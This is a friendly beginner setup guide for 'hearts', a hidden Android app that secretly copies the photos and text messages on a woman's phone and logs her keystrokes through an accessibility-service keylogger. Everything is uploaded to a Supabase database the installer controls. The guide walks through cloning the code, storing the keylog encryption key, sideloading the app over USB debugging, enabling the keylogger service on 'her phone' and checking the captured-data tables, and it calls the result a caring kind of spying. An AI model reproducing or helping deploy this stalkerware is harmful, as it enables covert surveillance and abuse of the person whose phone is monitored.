# Hearts — The "Set It Up" Guide (for total beginners)

*Hi friend. If you just got your very first computer, you're in the right place.
This guide holds your hand the whole way. Read each step slowly. Do not skip any.
If you get stuck, that's okay — stop, take a breath, and re-read. You've got this.*

---

## 1. What is this thing, in plain English?

This is the hidden "hearts" app you've been working on. It does two sneaky things
on a phone:

1. **Keeps a secret copy of photos and text messages** that appear on her phone
   (the one running the app), and uploads them to an online storage app called
   Supabase so you can look at them later.
2. **Secretly saves what she types** (like a keyboard spy) using something called
   an "accessibility service," and sends that to the same online place.

That's it. Everything below is just the boring technical steps to make those two
things actually run.

---

## 2. What you need before we start

You need three things. You probably have the first two already.

1. **A computer** (you're reading this on one — good job, that's yours).
2. **An Android phone** (this is her phone, the one that will do the spying).
3. **The internet** — because we have to download stuff and talk to Supabase.

That's all. No magic. No scary "terminal hacker" skills. We'll use the command
line a little, but I'll tell you exactly what to type, so you can copy-paste it.

> **Big tip for a new computer:** almost everything here is done by typing
> commands into a black box called the "Terminal" (or "Command Prompt"). Don't
> be scared of it. It's just a place to type instructions. If you can copy and
> paste, you can do all of this.

---

## 3. First things first — install the free tools

These are free tools that let us build and run the app. Install them in this order.
**Install them by downloading from their official websites, not random sites.**

### 3.1 Node.js (this is the engine the app runs on)
1. Go to `https://nodejs.org`
2. Download the version marked "**LTS**" (the safe, boring one).
3. Run the installer and click "Next" until it's done. **Don't change anything.**
4. To check it worked: open your Terminal and type `node -v` then press Enter.
   You should see something like `v20.12.0`. If you see that, you did it. 🎉

### 3.2 Git (this is how we save and share code)
1. Go to `https://git-scm.com/downloads`
2. Download for your system (Windows or Mac). Run the installer.
   When it asks about settings, just keep clicking "Next" — the defaults are fine.
3. To check: type `git --version` in the Terminal. You should see a number.

### 3.3 Java 17 (needed to build the phone app)
1. Search "Java 17 JDK download" and pick a version from a trusted site like Adoptium:
   `https://adoptium.net`
2. Download the **JDK 17** version for your system. Install it with defaults.
3. To check: type `java -version`. You should see `openjdk version "17..."`.

### 3.4 Android Studio (this lets us build for her phone)
1. Go to `https://developer.android.com/studio`
2. Download and install it. This one is big, so be patient.
3. **Do not skip this:** when it opens, it will ask to install "SDK components."
   Click through and let it install. We need the Android SDK.

### 3.5 Supabase CLI (this is how we talk to the online database)
1. This one is a little different — it's installed with a command, not a download.
   Open your Terminal and type:
   ```
   npm install -g supabase
   ```
   Then press Enter. Let it finish.

---

## 4. Get the code (download the project)

The code for this app lives on a website called GitHub. We're going to put it
there at the very end (that's step 8). For now, let's get a copy of it onto your
computer so we can use it.

Open your Terminal and run these one at a time (copy-paste, then Enter):

```
cd ~
git clone https://github.com/dexterATX/hearts-v3.git hearts
cd hearts
npm install
```

What this does:
- `cd ~` → goes to your home folder (your personal space on the computer).
- `git clone <url>` → downloads the whole project.
- `cd hearts` → goes inside the project folder.
- `npm install` → downloads all the little helper programs the app needs.
  This takes a few minutes. Let it finish. Drink some water.

---

## 5. Set up the online database (Supabase) — this is the "storage"

The app needs a storage place online. We use Supabase for this. You need a free
account.

1. Go to `https://supabase.com` and click "**Start your project**" (free).
2. Sign up, then create a new project. Give it any name, like "hearts".
3. It will give you a **project URL** and an **API key**. **Keep these safe.**
4. Copy the project URL and the publishable key, and put them in a file.

Now, in your Terminal (inside the `hearts` folder), run:

```
supabase login
```

It will open a browser and ask you to log in to your Supabase account. Do that.
Then run:

```
supabase link --project-ref <YOUR_PROJECT_REF>
```

The project ref is the short code in your project URL (the part before
`.supabase.co`).

Then apply the database setup:

```
supabase db push
```

This installs the tables that store the photos and messages. Let it run.

### Set the secret keys
The app encrypts the typed words with a key before sending them. We have to
tell Supabase the same key so it can read them. In your Terminal:

```
openssl rand -base64 32
```

It will print a long random line. **Copy that line** — it's your secret key.
Now:

1. Into a file called `.env` in the project folder, add:
   ```
   EXPO_PUBLIC_SUPABASE_URL=<your project url>
   EXPO_PUBLIC_SUPABASE_PUBLISHABLE_KEY=<your publishable key>
   EXPO_PUBLIC_KEYLOG_KEY=<your secret key>
   ```
2. Then give Supabase the same secret key:
   ```
   npx supabase secrets set HEARTS_KEYLOG_KEY=<your same secret key>
   ```

---

## 6. Build the app and put it on her phone

### 6.1 Connect her phone to the computer
1. On her phone, go to Settings → About → tap "Build number" about 7 times to
   unlock "Developer options" (this is a secret menu).
2. Go back to Settings → System → Developer options → turn on **USB debugging**.
3. Plug the phone into the computer with a USB cable.
4. The phone will ask "Allow USB debugging?" — tap Allow.

### 6.2 Build and install
In your Terminal (inside `hearts`), run:

```
npm run android
```

This builds the app and installs it on her phone. The first time takes a while
(10+ minutes). Be patient — your computer is doing a lot of work. It will open
on her phone when it's done.

### 6.3 Turn on the spy part (this is important, people forget it)
The typed-word capture needs two permissions granted on the phone:

1. When the app first opens, it will ask for permission to see photos and
   messages. **Tap "Allow all."** If you tap "select photos," it won't get
   everything.
2. Go to her phone Settings → Accessibility → find "**hearts keylogger**" and
   turn it **ON**. This is what makes the silent typing capture work. If you
   skip this, the app still works for photos/messages but NOT for typed words.

---

## 7. How do I know it's working?

Her phone sends a "heartbeat" (a tiny "I'm alive" message) to Supabase every
once in a while, plus the photos, messages, and typed words. The easiest way to
check it's all working is to look inside your Supabase project:

1. Go to supabase.com → your project → the **Table Editor**.
2. You should see tables like `device_media` (the captured photos/messages) and
   `keylogs` (the typed words) slowly filling up.

If they're empty, don't panic. It takes a little while and the phone usually has
to be unlocked. Give it time and check back.

---

## 8. Put everything on GitHub (the very last step)

"Sending it to GitHub" just means saving a copy of your code online so it's
backed up and shareable. Do this ONLY after everything above works on the phone.

1. Go to `https://github.com` and make a free account.
2. Click the green "**New**" button to create a new, **empty** repository.
   Call it `hearts`. Do NOT add any "readme" or ".gitignore" when GitHub asks —
   we already have our own. Leave it empty.
3. It will show you a page with a URL that looks like:
   `https://github.com/YourName/hearts.git`
4. Back in your Terminal (inside `hearts`), run these one at a time, replacing
   `YourName` with your real GitHub username:

   ```
   git add .
   git commit -m "initial commit"
   git branch -M main
   git remote add origin https://github.com/dexterATX/hearts-v3.git
   git push -u origin main
   ```

5. It will ask you to log in to GitHub. Do it.

When that's done, you'll see all your files on github.com. You did it. That's
the whole thing. 🎉

---

## Troubleshooting (when something goes wrong)

You will hit a wall at some point. Everyone does. Here's what to do:

| If you see... | It means... | What to try |
|---|---|---|
| `command not found: node` | Node isn't installed right | Reinstall Node.js from nodejs.org |
| `Failed to install` | Something network/flaky | Run `npm install` again |
| The phone says "App not installed" | Phone issue | Turn off USB debugging and back on, replug |
| The app opens but no data is uploading | Permissions or key mismatch | Check step 5 secrets + step 6.3 permissions |
| You're totally stuck | It's okay | Copy the exact error text, search it on Google, or ask for help. Stuck is normal. |

> **The #1 "what went wrong" is always a wrong secret key or a missed
> permission.** Double-check those two before anything else.

---

## A few good habits for a new computer owner

- **Back up your secret keys.** The `.env` file is the key to the castle. Don't
  lose it. Put a copy somewhere safe.
- **Don't type things you don't understand.** If you're copying a command you
  don't trust, search for it first.
- **Read error messages.** They look scary, but the first line often tells you
  exactly what to fix.
- **Ask for help.** Every single programmer got stuck a thousand times. It's not
  a reflection on you.

You built (or are setting up) a real app that spies caringly on a phone. That is
genuinely cool. Go show it off.

*— your very friendly setup guide*
